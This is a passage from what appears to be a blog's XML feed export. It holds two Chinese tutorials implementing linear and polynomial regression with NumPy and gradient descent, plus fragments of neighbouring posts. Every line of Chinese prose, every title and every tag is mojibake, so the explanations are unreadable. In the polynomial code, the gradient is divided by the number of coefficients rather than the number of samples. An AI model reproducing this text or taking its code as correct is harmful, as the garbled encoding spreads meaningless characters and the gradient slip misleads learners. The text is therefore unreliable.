<h3 id="8-åˆ†å‰²çº¿"><a href="#8-åˆ†å‰²çº¿" class="headerlink" title="8.åˆ†å‰²çº¿"></a>8.åˆ†å‰²çº¿</h3><p>ç”¨ä¸‰ä¸ªæˆ–è€…ä¸‰ä¸ªä»¥ä¸Šçš„â€œ-â€æˆ–è€…â€œ*â€éƒ½å¯ä»¥</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">***</span><br></pre></td></tr></table></figure>
<hr>
<hr>
]]></content>
      <categories>
        <category>æ•™ç¨‹</category>
      </categories>
      <tags>
        <tag>æ•™ç¨‹</tag>
      </tags>
  </entry>
  <entry>
    <title>numpyå®ç°å¤šé¡¹å¼å›å½’æ¨¡å‹</title>
    <url>/2022/04/11/numpy%E5%AE%9E%E7%8E%B0%E5%A4%9A%E9%A1%B9%E5%BC%8F%E5%9B%9E%E5%BD%92%E6%A8%A1%E5%9E%8B/</url>
    <content><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>ä¹¦æ¥ä¸Šå›ï¼Œä¸Šå›æˆ‘ä»¬ä»‹ç»äº†çº¿æ€§å›å½’ï¼Œè¿™æ¬¡æˆ‘ä»¬æ¥å…³æ³¨ä¸€ä¸‹å¤šé¡¹å¼å›å½’ã€‚</p>
<p>å¯¹äºå¤šé¡¹å¼å›å½’ï¼Œå›å½’å‡½æ•°æ˜¯å›å½’å˜é‡å¤šé¡¹å¼çš„å›å½’ ï¼Œå®é™…ä¸Šçº¿æ€§å›å½’æ˜¯å¤šé¡¹å¼å›å½’ä¸­çš„ç‰¹æ®Šæƒ…å†µï¼Œå³æ­¤è‡ªå˜é‡çš„é¡¹æ¬¡æ˜¯ä¸€æ¬¡ã€‚</p>
<a id="more"></a>

<h2 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h2><p><a href="https://baike.baidu.com/item/%E6%B3%B0%E5%8B%92%E5%85%AC%E5%BC%8F" target="_blank" rel="noopener">æ³°å‹’å…¬å¼</a>å‘Šè¯‰æˆ‘ä»¬ï¼Œä»»ä½•å‡½æ•°åœ¨ä¸€å®šåŒºé—´å†…éƒ½å¯ä»¥ç”¨å¤šé¡¹å¼å‡½æ•°è¿›è¡Œé€¼è¿‘ï¼Œå³</p>
<p><img src="https://qiniu.yalexin.top/QQ%E6%88%AA%E5%9B%BE20220411221527.png" alt></p>
<p>å‡è®¾æˆ‘ä»¬çš„<code>n=1</code>ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å›åˆ°äº†çº¿æ€§æ¨¡å‹ã€‚</p>
<p>ç†è®ºä¸Šæˆ‘ä»¬çš„<code>n</code>è¶Šå¤§ï¼Œæˆ‘ä»¬çš„å‡½æ•°å°±æ›´åŠ é€¼è¿‘åŸå‡½æ•°ï¼Œä¸è¿‡åœ¨å®é™…è¿ç®—ä¸­ï¼Œè¯¥å€¼è¶Šå¤§ï¼Œè®¡ç®—é‡ä¹Ÿå°±è¶Šå¤§ï¼Œè€Œä¸”è®¡ç®—æœºè¿ç®—è¿‡ç¨‹ä¸­ä¹Ÿå®¹æ˜“æº¢å‡ºï¼Œå› æ­¤è¯¥å€¼åº”è¯¥æœ‰ä¸€ä¸ªæ¯”è¾ƒç¬¦åˆå®é™…æ„ä¹‰çš„å€¼ã€‚</p>
<p>å‚ç…§ä¸Šæ–‡ï¼Œæˆ‘ä»¬å¯ä»¥å†™å‡ºæŸå¤±å‡½æ•°ä¸ºï¼š</p>
<p><img src="https://qiniu.yalexin.top/QQ%E6%88%AA%E5%9B%BE20220412180437.png" alt></p>
<p>è¯¥å‡½æ•°å¯¹æ¯ä¸€é¡¹çš„ç³»æ•°æ±‚å¯¼ä¸ºï¼š</p>
<p><img src="https://qiniu.yalexin.top/QQ%E6%88%AA%E5%9B%BE20220412193952.png" alt></p>
<p>æ›´æ–°å‚æ•°æ–¹æ³•ä¾æ—§æ˜¯ä½¿ç”¨æ¢¯åº¦ä¸‹é™åˆ†ææ³•ï¼š</p>
<p><img src="https://qiniu.yalexin.top/QQ%E6%88%AA%E5%9B%BE20220412185006.png" alt></p>
<h2 id="ä»£ç å®ç°"><a href="#ä»£ç å®ç°" class="headerlink" title="ä»£ç å®ç°"></a>ä»£ç å®ç°</h2><p>æˆ‘ä»¬å…ˆäº§ç”Ÿä¸€ä¸ªä¸‰è§’å‡½æ•°çš„æ•°æ®ï¼Œå¹¶åŠ å…¥éšæœºåå·®ï¼Œæ¨¡æ‹Ÿéçº¿æ€§æ•°æ®ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">def Data():</span><br><span class="line">    x &#x3D; np.linspace(0, 1, 100)</span><br><span class="line">    y &#x3D; np.sin(5 * x) + 0.1 + np.random.randn(len(x)) * 0.1</span><br><span class="line">    return x, y</span><br></pre></td></tr></table></figure>

<p><img src="https://qiniu.yalexin.top/QQ%E6%88%AA%E5%9B%BE20220412190802.png" alt></p>
<p>å†å®šä¹‰å‚æ•°åˆå§‹åŒ–å‡½æ•°ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">init</span><span class="params">(len=<span class="number">5</span>)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    len æ˜¯å¤šé¡¹å¼æ¬¡æ•°ï¼Œè¯¥å‡½æ•°è¿”å›å¤šé¡¹å¼çš„æ¯ä¸€ä¸ªç³»æ•°</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">return</span> np.random.randn(len) * <span class="number">0.5</span></span><br></pre></td></tr></table></figure>

<p>æ¥ä¸‹æ¥å°±æ˜¯æˆ‘ä»¬çš„å›å½’ä¸»ä½“éƒ¨åˆ†å•¦ï¼</p>
<p>åœ¨è¿™ä¹‹å‰ï¼Œæˆ‘ä»¬æ¥å­¦ä¹ ä¸€ä¸‹æ€ä¹ˆä½¿ç”¨<code>NumPy</code>æ¥å®ç°å¤šé¡¹å¼è®¡ç®—ï¼šåœ¨<code>NumPy</code>ä¸­ï¼Œå¦‚æœæˆ‘ä»¬è¦è®¡ç®—:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">f(x) = a + b * x + c * x^2 + d * x^3</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥ä½¿ç”¨ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">f = np.poly1d(theta)</span><br><span class="line">f(x)</span><br></pre></td></tr></table></figure>

<p>å…¶ä¸­ï¼Œ<code>theta</code>æ˜¯å¤šé¡¹å¼ç³»æ•°ï¼Œä¾‹å¦‚è®¡ç®—<code>f(x)=0.7 * x^2+ 0.6 * x + 0.5</code>åœ¨<code>x=1.2</code>çš„å€¼ï¼Œå¯ä»¥ç”¨ä¸‹é¢çš„ä»£ç å®Œæˆï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">f = np.poly1d([<span class="number">0.7</span>, <span class="number">0.6</span>, <span class="number">0.5</span>])</span><br><span class="line">f(<span class="number">1.2</span>)</span><br><span class="line"><span class="number">2.2279999999999998</span></span><br></pre></td></tr></table></figure>

<p><strong>è®°ä½ï¼Œ<code>np.poly1d()</code>ä¸­çš„å‚æ•°æ˜¯ä»å¤šé¡¹å¼æœ€é«˜é¡¹å¼€å§‹çš„</strong></p>
<p>å› æ­¤æˆ‘ä»¬å¯ä»¥å®šä¹‰è®¡ç®—<code>y_hat</code>çš„å‡½æ•°ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getY_Hat</span><span class="params">(x, theta)</span>:</span></span><br><span class="line">    <span class="comment"># æ ¹æ® theta ä½œä¸ºç³»æ•°ï¼Œç”Ÿæˆå¤šé¡¹å¼å‡½æ•°</span></span><br><span class="line">    f = np.poly1d(theta)</span><br><span class="line">    <span class="keyword">return</span> f(x)</span><br></pre></td></tr></table></figure>

<p>æœ‰äº†è¯¥å‡½æ•°åï¼Œæˆ‘ä»¬å¯ä»¥ç»§ç»­å®šä¹‰<code>loss</code>å‡½æ•°ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">loss</span><span class="params">(y, yHat)</span>:</span></span><br><span class="line">    n = len(y)</span><br><span class="line">    t1 = (y - yHat) * (y - yHat)</span><br><span class="line">    <span class="keyword">return</span> sum(t1) / n</span><br></pre></td></tr></table></figure>

<p>æ¢¯åº¦ä¸‹é™åˆ†ææ³•ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># æ›´æ–°æ¯ä¸€ä¸ªå‚æ•°</span></span><br><span class="line">n = len(theta)</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(n):</span><br><span class="line">    sm = sum((y_hat - y) * (x ** (n - <span class="number">1</span> - j)))</span><br><span class="line">    roundThetaIdx =  <span class="number">2</span> * sm / n</span><br><span class="line">    theta[j] = theta[j] - learning_rate * roundThetaIdx</span><br></pre></td></tr></table></figure>

<p>æœ€ç»ˆçš„ç»“æœï¼š</p>
<p><img src="https://qiniu.yalexin.top/QQ%E6%88%AA%E5%9B%BE20220412193145.png" alt></p>
<h2 id="å®Œæ•´ä»£ç "><a href="#å®Œæ•´ä»£ç " class="headerlink" title="å®Œæ•´ä»£ç "></a>å®Œæ•´ä»£ç </h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">Created on Tue Apr 12 17:47:32 2022</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">@author: YaleXin</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt </span><br><span class="line"></span><br><span class="line"><span class="comment">#%%</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Data</span><span class="params">()</span>:</span></span><br><span class="line">    x = np.linspace(<span class="number">0</span>, <span class="number">1</span>, <span class="number">100</span>)</span><br><span class="line">    y = np.sin(<span class="number">5</span> * x) + <span class="number">0.1</span> + np.random.randn(len(x)) * <span class="number">0.1</span></span><br><span class="line">    <span class="keyword">return</span> x, y</span><br><span class="line"><span class="comment">#%%</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">init</span><span class="params">(len=<span class="number">5</span>)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    len æ˜¯å¤šé¡¹å¼æ¬¡æ•°</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">return</span> np.random.randn(len) * <span class="number">0.5</span></span><br><span class="line"><span class="comment">#%%</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getY_Hat</span><span class="params">(x, theta)</span>:</span></span><br><span class="line">    <span class="comment"># æ ¹æ® theta ä½œä¸ºç³»æ•°ï¼Œç”Ÿæˆå¤šé¡¹å¼å‡½æ•°</span></span><br><span class="line">    f = np.poly1d(theta)</span><br><span class="line">    <span class="keyword">return</span> f(x)</span><br><span class="line"><span class="comment">#%%</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">loss</span><span class="params">(y, yHat)</span>:</span></span><br><span class="line">    n = len(y)</span><br><span class="line">    t1 = (y - yHat) * (y - yHat)</span><br><span class="line">    <span class="keyword">return</span> sum(t1) / n</span><br><span class="line"><span class="comment">#%%</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">PolynomialRegression</span><span class="params">(x, y, theta, ax, epoch=<span class="number">100</span>, learning_rate = <span class="number">0.01</span>)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    æ¢¯åº¦ä¸‹é™æ³•</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    ax.set_title(<span class="string">"Loss change process"</span>)</span><br><span class="line">    loss_x = []</span><br><span class="line">    loss_y = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(epoch):</span><br><span class="line"></span><br><span class="line">        y_hat = getY_Hat(x, theta)</span><br><span class="line">        lst = loss(y, y_hat)</span><br><span class="line">        loss_x.append(i)</span><br><span class="line">        loss_y.append(lst)</span><br><span class="line">        print(<span class="string">"lost = "</span> + str(lst))</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># æ›´æ–°æ¯ä¸€ä¸ªå‚æ•°</span></span><br><span class="line">        n = len(theta)</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(n):</span><br><span class="line">            sm = sum((y_hat - y) * (x ** (n - <span class="number">1</span> - j)))</span><br><span class="line">            roundThetaIdx =  <span class="number">2</span> * sm / n</span><br><span class="line">            theta[j] = theta[j] - learning_rate * roundThetaIdx</span><br><span class="line">    ax.plot(loss_x, loss_y)</span><br><span class="line">    <span class="keyword">return</span> theta</span><br><span class="line"><span class="comment">#%%</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">plotAns</span><span class="params">(x, y, Y, ax)</span>:</span></span><br><span class="line">    <span class="string">"""ç»˜åˆ¶å›¾å½¢    </span></span><br><span class="line"><span class="string">    yæ˜¯æ•°æ®åŸå§‹çš„yå€¼ï¼ŒYæ˜¯æ‹Ÿåˆå¾—åˆ°çš„å€¼</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    ax.set_title(<span class="string">'Polynomial regression result'</span>)</span><br><span class="line">    ax.scatter(x, y, label = <span class="string">r'$y = f(x)$'</span>)</span><br><span class="line">    ax.plot(x, Y, label=<span class="string">r'$y = f(x)-theta $'</span>, color=<span class="string">'red'</span>)</span><br><span class="line">    ax.legend(loc=<span class="string">'upper left'</span>,prop=&#123;<span class="string">'family'</span>:<span class="string">'SimHei'</span>,<span class="string">'size'</span>:<span class="number">8</span>&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">#%%</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    </span><br><span class="line">    fig = plt.figure()</span><br><span class="line">    cost_ax = fig.add_subplot(<span class="number">1</span>,<span class="number">2</span>,<span class="number">1</span>)  </span><br><span class="line">    ans_ax = fig.add_subplot(<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>)  </span><br><span class="line">    </span><br><span class="line">    <span class="comment"># è½½å…¥å¤šé¡¹å¼å›å½’æ•°æ®</span></span><br><span class="line">    x, y = Data()</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># åˆå§‹åŒ– æœ€é«˜æ¬¡æ•°ä¸º 10 çš„ä¸€ç»„ç³»æ•°</span></span><br><span class="line">    theta = init(<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># è®¾ç½®å­¦ä¹ ç‡</span></span><br><span class="line">    my_learning_rate = <span class="number">0.02</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># # æ±‚è§£æœ€ä¼˜å‚æ•°</span></span><br><span class="line">    theta = PolynomialRegression(x, y, theta, cost_ax,epoch=<span class="number">3000</span>)</span><br><span class="line">    f = np.poly1d(theta)</span><br><span class="line">    yhat = f(x)</span><br><span class="line">    </span><br><span class="line">    plotAns(x, y, yhat, ans_ax)</span><br><span class="line">    plt.show()</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>æœºå™¨å­¦ä¹ </category>
      </categories>
      <tags>
        <tag>å¤šé¡¹å¼å›å½’</tag>
        <tag>æ³°å‹’å±•å¼€</tag>
        <tag>python</tag>
        <tag>NumPy</tag>
      </tags>
  </entry>
  <entry>
    <title>numpyå®ç°çº¿æ€§å›å½’æ¨¡å‹</title>
    <url>/2022/03/25/numpy%E5%AE%9E%E7%8E%B0%E7%BA%BF%E6%80%A7%E5%9B%9E%E5%BD%92%E6%A8%A1%E5%9E%8B/</url>
    <content><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>ç”Ÿæ´»ä¸­å¸¸å¸¸é‡åˆ°çº¿æ€§æ¨¡å‹çš„ä¾‹å­ï¼Œä¾‹å¦‚æˆ¿å­çš„ä»·æ ¼ä¸å åœ°é¢ç§¯å‡ ä¹æ˜¯å‘ˆçº¿æ€§ï¼Œå®ƒè¿˜å¯èƒ½å’Œå§å®¤æ•°é‡ç›¸å…³ï¼›åˆå¦‚ä¸€ä¸ªå­¦ç”Ÿæ˜¯å¦å…·å¤‡è·å–å¥–å­¦é‡‘èµ„æ ¼ä¸å­¦ç”Ÿæˆç»©ã€å‚ä¸ç«èµ›ç»å†ã€ç­å¹²éƒ¨ä»»èŒç»å†éƒ½ç›¸å…³ï¼›åˆå¦‚ä¸€ä¸ªå¤§å­¦ç”Ÿæ˜¯å¦èƒ½å¤Ÿåœ¨å¤§å­¦ä¸­è„±å•ï¼Œä¸ä¸ªäººç›¸è²Œã€ä¸ºäººå¤„äº‹èƒ½åŠ›ã€ç”Ÿæ´»ä¹ æƒ¯éƒ½æœ‰è”ç³»ã€‚</p>
<a id="more"></a>

<h2 id="ç›¸å…³åŸç†"><a href="#ç›¸å…³åŸç†" class="headerlink" title="ç›¸å…³åŸç†"></a>ç›¸å…³åŸç†</h2><p>ä»¥é¢„æµ‹æˆ¿å­ä»·æ ¼ä¸ºä¾‹ï¼Œå¦‚æœå°†æˆ¿å­é¢ç§¯<code>x1</code>ã€å§å®¤æ•°é‡<code>x2</code>ä½œä¸ºç‰¹å¾ï¼Œæˆ¿å­ä»·æ ¼ä¸ºç›®æ ‡ï¼Œåˆ™å¯ä»¥è¡¨ç¤ºä¸ºï¼š</p>
<p><img src="https://qiniu.yalexin.top/QQ%E6%88%AA%E5%9B%BE20220325230950.png" alt></p>
<p>å¼å­ä¸­çš„<code>w</code>ä»£è¡¨ç›¸åº”çš„ç‰¹å¾æƒé‡ï¼Œ<code>b</code>ä»£è¡¨åç½®ã€‚</p>
<p>ç”¨å‘é‡å¯ä»¥è¡¨ç¤ºä¸ºï¼š</p>
<p><img src="https://qiniu.yalexin.top/QQ%E6%88%AA%E5%9B%BE20220325232055.png" alt></p>
<p>è€Œæˆ‘ä»¬çš„ç›®æ ‡æ˜¯å¯¹äºç»™å®šæ•°æ®é›†ï¼Œæˆ‘ä»¬æ±‚å‡ºæœ€ç¬¦åˆçš„å‚æ•°<code>w1</code>å’Œ<code>w2</code>ï¼Œä»¥åŠ<code>b</code>ï¼Œä½¿å¾—æ¨¡å‹å¾ˆå¥½åœ°è´´è¿‘æ•°æ®é›†ï¼Œæˆ‘ä»¬è¯¥å¦‚ä½•åº¦é‡æˆ‘ä»¬çš„æ¨¡å‹æ˜¯å¦å’Œæ•°æ®é›†è´´è¿‘å‘¢ï¼Ÿæˆ‘ä»¬è¿™é‡Œå¹³æ–¹å·®æ¥è¡¨ç¤ºäºŒè€…çš„å·®è·ï¼Œè®¡ç®—è¯¥å¹³æ–¹å·®çš„å‡½æ•°æˆ‘ä»¬ç§°ä¹‹ä¸ºæŸå¤±å‡½æ•°ï¼Œæˆ‘ä»¬çš„æ ·æœ¬çš„é¢„æµ‹å€¼ä¸º<code>y_hat</code>ï¼ŒçœŸå®å€¼ä¸º<code>y</code>ï¼Œåˆ™æŸå¤±å‡½æ•°å¦‚ä¸‹ï¼š</p>
<p><img src="https://qiniu.yalexin.top/QQ%E6%88%AA%E5%9B%BE20220325232645.png" alt></p>
<p>ä¸Šé¢çš„å¸¸æ•°<code>1/2</code>å¹¶ä¸æ˜¯ç¡¬æ€§è¦æ±‚ï¼Œåªæ˜¯ä¸ºäº†æ–¹ä¾¿åé¢æ±‚å¯¼ä½¿å¾—ç³»æ•°å˜ä¸º<code>1</code>ã€‚</p>
<p>å› æ­¤é—®é¢˜è½¬å˜æˆæ‰¾åˆ°ä¸€ç»„å‚æ•°ï¼Œä½¿å¾—æ‰€æœ‰æ ·æœ¬çš„æŸå¤±å’Œå˜å¾—æœ€å°ï¼Œå³</p>
<p><img src="https://qiniu.yalexin.top/QQ%E6%88%AA%E5%9B%BE20220325233600.png" alt></p>
<p>å®é™…ä¸Šä¹Ÿæ˜¯åœ¨æ±‚ä¸Šè¿°å‡½æ•°çš„æå°å€¼ã€‚ä¸ºäº†æ–¹ä¾¿è¿ç®—ï¼Œæˆ‘ä»¬å¯ä»¥å°†å‚æ•°<code>w</code>å’Œ<code>b</code>åˆå¹¶ï¼Œå¹¶åœ¨<code>x</code>å³è¾¹å¢åŠ ä¸€åˆ—ï¼š</p>
<p><img src="https://qiniu.yalexin.top/QQ%E6%88%AA%E5%9B%BE20220326103156.png" alt></p>
<p>å³æŸå¤±å‡½æ•°åˆå¯ä»¥è¡¨ç¤ºä¸ºï¼š</p>
<p><img src="https://qiniu.yalexin.top/QQ%E6%88%AA%E5%9B%BE20220326082005.png" alt></p>
<p>å°å­¦äºŒå¹´çº§çš„æ•°å­¦è€å¸ˆå‘Šè¯‰æˆ‘ä»¬ï¼Œè¿™ä¸ªæ˜¯å…³äºè‡ªå˜é‡<code>W*</code>ï¼ˆæ³¨æ„ï¼Œè¿™é‡Œçš„<code>x</code>å’Œ<code>y</code>éƒ½æ˜¯å¸¸é‡ï¼‰çš„äºŒæ¬¡å‡½æ•°ï¼Œæœ‰æå€¼ï¼Œé‚£æˆ‘ä»¬è¯¥æ€ä¹ˆæ±‚è§£ï¼Ÿæ•°å­¦è€å¸ˆç»§ç»­å‘Šè¯‰æˆ‘ä»¬ï¼ŒäºŒæ¬¡å‡½æ•°æå€¼å¯ä»¥åˆ©ç”¨å…¬å¼ï¼å½“ç„¶ä¹Ÿå¯ä»¥ä½¿ç”¨æ¢¯åº¦ä¸‹é™åˆ†ææ³•ï¼Œå› ä¸ºæœ‰äº›æ¨¡å‹ä¸å¯ä»¥ç”¨å…¬å¼ç›´æ¥æ±‚è§£æå€¼ï¼</p>
<p>æ¢¯åº¦ä¸‹é™åˆ†ææ³•å‚æ•°æ›´æ–°æ–¹å¼æ˜¯ï¼š<code>w = w - learning_rate * grad</code>ï¼Œ<code>grad</code>æ˜¯åœ¨è¯¥ç‚¹çš„æ¢¯åº¦ï¼Œå³å¯¼æ•°ï¼ˆå¯ä»¥ç²—ç•¥åœ°ç§°ä¸ºå¯¼æ•°ï¼Œä½†æ˜¯ä¸¥æ ¼æ¥è¯´è¿™æ ·å­çš„è¯´æ³•æ˜¯é”™è¯¯çš„ï¼‰</p>
<p><img src="https://qiniu.yalexin.top/QQ%E6%88%AA%E5%9B%BE20220326085926.png" alt></p>
<p>å¦‚ä¸Šå›¾æ‰€ç¤ºï¼Œå¯¹äºå·¦è¾¹çš„ç‚¹ï¼Œå…¶å¯¼æ•°ä¸ºè´Ÿæ•°ï¼Œå‡å»ä¸€ä¸ªè´Ÿæ•°ï¼ˆ<code>learning_rate</code>æˆ‘ä»¬ç§°ä¹‹ä¸ºå­¦ä¹ ç‡ï¼Œæ˜¯æ­£æ•°ï¼‰åå…¶å€¼å¢å¤§ï¼Œå³ç»è¿‡æ›´æ–°åï¼Œè‡ªå˜é‡<code>w</code>å¾€å³è¾¹èµ°äº†ä¸€æ®µè·ç¦»ï¼Œå¯¹äºå³è¾¹çš„ï¼Œæ›´æ–°åè‡ªå˜é‡å¾€å·¦è¾¹èµ°äº†ä¸€æ®µè·ç¦»ï¼Œæœ€ç»ˆæˆ‘ä»¬çš„<code>w</code>å°†è¶‹äº<code>1.0</code>ï¼Œå³æå€¼ç‚¹é™„è¿‘ã€‚</p>
<p>æŸå¤±å‡½æ•°å¯¹<code>W</code>æ±‚å¯¼ä¸ºï¼š</p>
<p><img src="https://qiniu.yalexin.top/QQ%E6%88%AA%E5%9B%BE20220326093933.png" alt></p>
<h2 id="å›å½’å®ç°"><a href="#å›å½’å®ç°" class="headerlink" title="å›å½’å®ç°"></a>å›å½’å®ç°</h2><p>ç®€å•èµ·è§ï¼Œæˆ‘ä»¬å‡è®¾åªæœ‰ä¸€ä¸ªç‰¹å¾ï¼Œå³åªæœ‰ä¸€ä¸ª<code>x</code>ï¼Œè€Œä¸æ˜¯æœ‰<code>x1,x2,...</code>æˆ‘ä»¬é¦–å…ˆç”Ÿæˆä¸€ç»„çº¿æ€§æ•°æ®ï¼Œä¸ºäº†æ›´ç¬¦åˆå®é™…ï¼Œæˆ‘ä»¬åŠ å…¥éšæœºåå·®ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">data</span><span class="params">()</span>:</span></span><br><span class="line">    x = np.linspace(<span class="number">-20</span>, <span class="number">20</span>, <span class="number">50</span>)</span><br><span class="line">    y = <span class="number">2</span>*x + <span class="number">3</span> + np.random.randn(len(x)) * <span class="number">3</span></span><br><span class="line">    x = x.reshape(<span class="number">-1</span>, <span class="number">1</span>)</span><br><span class="line">    y = y.reshape(<span class="number">-1</span>, <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> x, y</span><br></pre></td></tr></table></figure>

<p>ç„¶ååˆå§‹åŒ–æˆ‘ä»¬çš„å‚æ•°<code>w,b</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">init</span><span class="params">()</span>:</span></span><br><span class="line">    w, b = np.random.randn(), np.random.randn()</span><br><span class="line">    <span class="comment"># å‚æ•°åˆå¹¶</span></span><br><span class="line">    <span class="keyword">return</span> np.array([[w],</span><br><span class="line">                     [b]])</span><br></pre></td></tr></table></figure>

<p>å®šä¹‰è¯¯å·®å‡½æ•°</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">l</span><span class="params">(W, X, y)</span>:</span></span><br><span class="line">    WX = np.dot(X, W) - y</span><br><span class="line">    <span class="keyword">return</span> WX ** <span class="number">2</span> / <span class="number">2.0</span></span><br></pre></td></tr></table></figure>

<p>å®šä¹‰æŸå¤±å‡½æ•°ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">loss</span><span class="params">(W, X, y)</span>:</span></span><br><span class="line">    l_value = l(W, X, y)</span><br><span class="line">    n = X.shape[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">return</span> np.sum(l_value) / n</span><br></pre></td></tr></table></figure>

<p>æ¢¯åº¦ä¸‹é™æ³•ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gradient_descent</span><span class="params">(W, X, y)</span>:</span></span><br><span class="line">    n = y.shape[<span class="number">0</span>]</span><br><span class="line">    A = np.dot(X, W) - y</span><br><span class="line">    <span class="keyword">return</span> np.dot(X.T, A) / n</span><br></pre></td></tr></table></figure>

<p>å¼€å§‹æˆ‘ä»¬çš„è®­ç»ƒï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">train</span><span class="params">()</span>:</span></span><br><span class="line">    learning_rate, epoch = <span class="number">0.01</span>, <span class="number">100</span></span><br><span class="line">    W = init()</span><br><span class="line">    x, y = data()</span><br><span class="line">    one = np.ones((x.shape[<span class="number">0</span>],<span class="number">1</span>))</span><br><span class="line">    X = np.c_[x, one]</span><br><span class="line">    loss_x, loss_y = np.zeros((epoch, <span class="number">1</span>)), np.zeros((epoch, <span class="number">1</span>))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(epoch):</span><br><span class="line">        loss_value = loss(W, X, y)</span><br><span class="line">        print(<span class="string">"epoch = "</span>, i, <span class="string">"loss = "</span>, loss_value)</span><br><span class="line">        loss_x[i] = i</span><br><span class="line">        loss_y[i] = loss_value</span><br><span class="line">        </span><br><span class="line">        grad = gradient_descent(W, X, y)</span><br><span class="line">        W = W - learning_rate * grad</span><br><span class="line">    plt.subplot(<span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>)</span><br><span class="line">    plt.scatter(x, y)</span><br><span class="line">    plt.plot(X[:, <span class="number">0</span>], np.dot(X, W), color=<span class="string">'red'</span>)</span><br><span class="line">    </span><br><span class="line">    plt.subplot(<span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>)</span><br><span class="line">    plt.title(<span class="string">"loss"</span>)</span><br><span class="line">    plt.plot(loss_x, loss_y)</span><br></pre></td></tr></table></figure>

<h2 id="ç»“æœ"><a href="#ç»“æœ" class="headerlink" title="ç»“æœ"></a>ç»“æœ</h2><p><img src="https://qiniu.yalexin.top/QQ%E6%88%AA%E5%9B%BE20220326103436.png" alt></p>
<p>å¯ä»¥å‘ç°ï¼Œæ‹Ÿåˆæ•ˆæœè¿˜æ˜¯æŒºä¸é”™çš„ï¼ŒæŸå¤±å€¼ä¸‹é™å¾—ä¹ŸæŒºå¿«ï¼Œå‰é¢çš„æ€¥å‰§ä¸‹é™æ˜¯å› ä¸ºæˆ‘ä»¬æ˜¯éšæœºåˆå§‹åŒ–çš„å‚æ•°ï¼Œè¯¥å‚æ•°å¯¹åº”çš„å¯¼æ•°å¯èƒ½æ¯”è¾ƒå¤§ï¼Œå› æ­¤æ›´æ–°å¾—æ¯”è¾ƒå¿«ã€‚</p>
]]></content>
      <categories>
        <category>æœºå™¨å­¦ä¹ </category>
      </categories>
      <tags>
        <tag>çº¿æ€§å›å½’</tag>
      </tags>
  </entry>
  <entry>
    <title>shellå­—ç¬¦ä¸²æˆªå–</title>
